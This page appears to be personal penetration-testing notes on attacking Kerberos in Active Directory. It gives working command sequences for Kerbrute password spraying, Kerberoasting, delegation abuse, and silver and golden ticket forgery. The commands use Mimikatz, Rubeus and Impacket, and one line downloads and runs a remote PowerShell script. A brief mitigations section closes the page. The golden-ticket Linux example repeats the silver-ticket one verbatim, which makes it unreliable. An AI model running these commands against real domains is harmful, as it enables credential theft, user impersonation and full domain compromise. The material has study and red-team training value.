# Attacking Kerberos

Looking at the process, there are some vulnerabilities in the checking of the system. They are as follows:

* The TGS only checks the Service Principal Name of the client to verify that it's the right user and if presented a TGT, so what happens if one spoofs the SPN?&#x20;
* Or what happens if the service account is compromised? Perhaps anyone can request for TGT's, and since they are encrypted with the user password, one can perhaps convert this to a hash and crack it if password is not complex.
* Once we have compromised the system, with access to the administrator, we can theoretically keep requesting tickets to access other parts of the domain to collect more information if needed.

Those are just some of the methods that can be used to exploit this system. Here will be explanations on the methods used and why they work.

## Kerbrute Enumeration

Kerbrute enumeration would abuse port 88 and attempt to brute force out possible usernames stored within the Kerberos system.​ Tools like Kerbrute can do this:

<figure><img src="../../.gitbook/assets/image (817).png" alt=""><figcaption><p><em>Kerbrute</em></p></figcaption></figure>

Above is a snapshot of the machine, and we can see how we are able to find some usernames from this.

```
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
```

## Kerberoasting

This would make use of the fact that we are able to spoof SPNs. A spoofed account can harvest TGS tickets for services that run on behalf of user accounts in the AD. Parts of the TGS is encryupted with user passwords, and can be cracked offline.

{% code title="From Linux" overflow="wrap" %}
```bash
GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```
{% endcode %}

{% code title="Windows Memory to Disk" overflow="wrap" %}
```powershell
Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts

#Get TGS in memory
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" 
 
klist #List kerberos tickets in memory
 
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder  
```
{% endcode %}

{% code title="Rubeus and Powershell" overflow="wrap" %}
```powershell
# Powerview
Request-SPNTicket -SPN "<SPN>" 

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mysqlaccnt /outfile:hashes.kerberoast 

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% endcode %}

## Unconstrained Delegation

Unconstrained delegation is a privilege that can be assigned to a user. **When a user authenticates to a computer that has this privilege turned on, the TGT gets saved to that computer's memory.**

This means the ticket can be used to sort of impersonate the authenticated user, and access other services on that user's behalf. An example use case is when a database admin can log in to any computer to retrieve information and manage the database. The ticket would then be automatically cached into the memory of that computer the user uses.

Naturally, this isn't secure, because someone with unauthorized acccess can basically have a TGT to crack immediately, and would be able to decipher user passwords. Either that or they can Pass The Ticket and be able to do other stuff as that user.&#x20;

{% code title="Enumeration" overflow="wrap" %}
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description # PowerView
```
{% endcode %}

{% code title="Exploitation" %}
```powershell
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'

Invoke-Mimikatz -Command '"kerberos::ptt TIcket.kirbi"'
# store ticket in klist, or memory

$session = New-PSSession -Computer ComputerNAME
Invoke-Command -ScriptBlock{whoami;hostname} -computername COMPUTERNAME
#establish a remote PS session and RCE as another user
```
{% endcode %}

## Constrained Delegation

This is the same thing as above, however instead of letting the account impersoante everyone, the user can only impersonate certain users. Hence, constrained.

```powershell
Get-NetUser -TrustedToAuth #find users with constrained delegation privilege

.\Rubeus.exe tgtdeleg #requesting for delegation TGT

.\Rubeus.exe s4u /ticket:doIFCDCCBQSgAwIBBaEDAgEWooIEDjCCBAphggQGMIIEAqADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUyjggPEMIIDwKADAgESoQMCAQKiggOyBIIDro3ZCHDaVettnJseuyFJMK+Il4GAtWVAHPAq02cnHmOs3R2KcrOWpf3YbtnTD7fB+rKdZ8aElgloJO+v4XVM2NgyOVIia0MzNToDrK1ynhC70aApbag+ykvUFTDeG9NjhE3TVk3+F99vWboy6hhc9AmRUJwHFuqLC4djtL2PtQSpgWWL42W5eONlIZkc5XK0kWkC/AvivuuPOHs9aEy3g38hoBeApZE8NqT7mGKz5JHLwV5TyUgo87s6fFVSn8LHK8CI6G0x2DRhxxu04q0qnRXhLJ5S0MyJgJj6YDVESvCUgep5MXR+OYp0EGdVP8qQJK+x6m4rmr0Y3nd1Klmc+xDnLSC11ay7I8VevqhCBCZ64c+HQow4qcMTa/agxyOXqK42ynUl0GJtrLV7nIIrp+J2e5PECDUXIjKFkGnp6HZDNfzYAGL3XxyyT2JYdneOS3VUzJQyEctjuQMdVA0wB8NrRqDVdqSNBSOyBwpB3/FWzdHNYxztRmVT+Yz6qJCU4SYHIzHUE5dqHjvhjPSwgAkhS/QNApxtWvyba8iwCSnyualuhK46LS0pkt1IIQT0Y+qw80oL6mzjD+rxfKgR4B9hI6Imw9zTT5rjlRNMjWEy78izLtRB+ulzqdkZCUMA6zswWjq1BTmWzZX0LAZ+QAWQJPzoRVsqOcZCZwo/aWwmO1s9v5TLRRMLTAvk16PQW3z9NHix2Io9sObH8cb7gVrB+u2Q545Qwekl0uwP5mCar6swU2oEkxBm5DZvLsbZTcGl+KzGxqq/zhEJm3EceLuwIY81z8aYu13c6AsYETs9VevdEVysylpNL7EcHu8iXsoE5JmLx7OrcPR9WfeFWxRDp+1CVDijOI5VOS51+JpkEvcXFmfZueqLTJ66VGJgQaP7A3B//Y40ur5nSXyvEmIKgzdeqPLpGa5GPiNs/rYFmMlxwEX+yVFB5bPYgoszr3Crjsvs6Q/vdr36NoWqI9/11Nurzeeknt+k8sUV26URnQVkecW4yJFQ2TZwYCJ1k9h4cr96csJ9HhJO46UBye/8oqlqJXKnYY3JpaZiXWK77kG7BqhM6oPl+oEIbX2ycj/gHesxREvP7/vYINk33KbOSxXTAi3Je3wbZP7N+3B9Lz04m8Xi6nGeIVsZiMyODpnJVX5Bgq+3cGaSty0v+fIfqMHDwuKhOS7h1MGLJduhWh3b21ytDfzn73yyCPskFee2ckAomlAgxMzg8ZatmZDLTxfUenJ+EnrJgkYee6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIN2JDvcjQZeMR+7giMsawE1vG/Cmw9IFIV7ZYwaELMqaoQ8bDU9GRkVOU0UuTE9DQUyiETAPoAMCAQGhCDAGGwRzcG90owcDBQBgoQAApREYDzIwMTkwODE3MTMyMDU2WqYRGA8yMDE5MDgxNzIzMDY0MFqnERgPMjAxOTA4MjQxMzA2NDBaqA8bDU9GRkVOU0UuTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc.domain.com /ptt
#loading ticket into memory
#/ticket is the base64 string retrieved using rubeus

klist
#check kerberos ticket memory
```

If all works well, we should be able to access the areas of the network that the user we impersonated can.

## Resourced-Based Constrained Delegation

This attack is possible because we have write privileges over another object within the domain.

For this, we would need to do the following:

* Verify we have WRITEprivileges over another object.
* Create a new computer object in AD.
* Leverage the privilege to update the new object's attribute to allow the new object to impersonate and authenticate as any domain user.
* Request for Kerberos tickets for the new computer object to impersonate whoever we want.

This would rely on the `msds-allowedtoactonbehalfofotheridentity` privilege.

{% code overflow="wrap" %}
```powershell
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
# check which users have this privilege

import-module powermad
New-MachineAccount -MachineAccount new01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
# create new object

Get-DomainComputer new01
#get Domain SID: S-1-5-21-...

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
#create a new security descriptor

Get-DomainComputer <TARGET NAME> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
#allow for new computer to be impersonated

.\Rubeus.exe hash /password:123456 /user:new01 /domain:domain.com
#generation of hash for our new fake object

.\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:http/<TARGET NAME> /altservice:cifs,host /ptt
#impersonation of user within domain.

.\PsExec.exe \\<TARGET NAME> cmd 
#spawn command shell for new computer
```
{% endcode %}

## Silver Tickets

Silver tickets are possible because we can basically **create our own valid TGS ticket once we have the password of the service account**. By forging this ticket, we basically are able to ensure that we have persistence.

This attack is more limited in power relative to Golden Ticket attacks.

{% code title="Linux" overflow="wrap" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-...  -domain domain.com -spn <domain>/<user> <filename>
# create new ticket

export KRB5CCNAME=<filename>.ccache
# export ticket into Linux memory

python psexec.py <domain>/<user>@<IP> -k -no-pass
#achieve RCE through psexec using ticket as authentication
```
{% endcode %}

{% code title="Windows" overflow="wrap" %}
```powershell
#Create ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-... /rc4:<LM HASH> /user:administrator /service:cifs /target:<computer name>"

#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi

#Obtain a shell
.\PsExec.exe -accepteula \\<computer name> cmd
```
{% endcode %}

## Golden Tickets <a href="#golden-tickets" id="golden-tickets"></a>

Once we have pwned the administrator, then a valid TGT for **any user** can be created using this account. From this, we basically create a ticket that can access **everywhere.** This is not limited to the domain admin account, but also we can do this through the use of the **krbtgt** account.

This can also be used to dump credentials of all users from the registry.

{% code title="Linux" overflow="wrap" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-...  -domain domain.com -spn <domain>/<user> <filename>
# create new ticket

export KRB5CCNAME=<filename>.ccache
# export ticket into Linux memory

python psexec.py <domain>/<user>@<IP> -k -no-pass
#achieve RCE through psexec using ticket as authentication
```
{% endcode %}

{% code title="" overflow="wrap" %}
```powershell
#mimikatz
kerberos::golden /User:Administrator /domain:domain.com /sid:S-1-5-21... /krbtgt:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:domain.com /sid<SID of admin> /aes256:<AES Key> /ticket:pwned.kirbi
```
{% endcode %}

## Mitigations <a href="#mitigations" id="mitigations"></a>

How to avoid all of these? Do the following:

### Change Passwords <a href="#change-passwords" id="change-passwords"></a>

Make sure that your password is complex enough, so in the case whereby your ticket is leaked, it cannot be cracked. This includes all administrator accounts, and service accounts, like krbtgt.

### Check Privileges <a href="#check-privileges" id="check-privileges"></a>

Ensure that correct privileges are maintained across all objects, so as to avoid the use case where compromised users are able to request for tickets or whatever.&#x20;

To prevent AS-REP Roasting in particular, Kerberos PreAuth must be enabled on the servers to prevent any user from requesting tickets without credentials. This can be done using the following:

```powershell
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
(Get-ACL "AD:\$((Get-ADUser -Filter 'useraccountcontrol -band 4194304').distinguishedname)").access
```

Apart from enabling these, you would also want to check if **they are disabled at all**. This can be done through monitoring Event **4738 or 5136.** These events check for changes within the Preauth configuration.&#x20;

### Update Kerberos <a href="#update-kerberos" id="update-kerberos"></a>

Self-explanatory. There are new CVEs being developed for Kerberos every year, so make sure your system is up to date with all the latest hotpatches and fixes.

### Inspect Kerberos Traffic <a href="#inspect-kerberos-traffic" id="inspect-kerberos-traffic"></a>

When an attacker is abusing silver or golden tickets, the logs would generally show that they are repeatedly requesting tickets and accessing unusual places. Firewalls with heuristics should be able to flag this out and block access, or lock the account until a sysadmin can verify what's going on.

### Enable Kerberos PreAuth

This would basically block all AS-REP Roasting and prevent the requesting of tickets without a password.&#x20;

## References <a href="#references" id="references"></a>

{% embed url="https://book.hacktricks.xyz/welcome/readme" %}

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse" %}
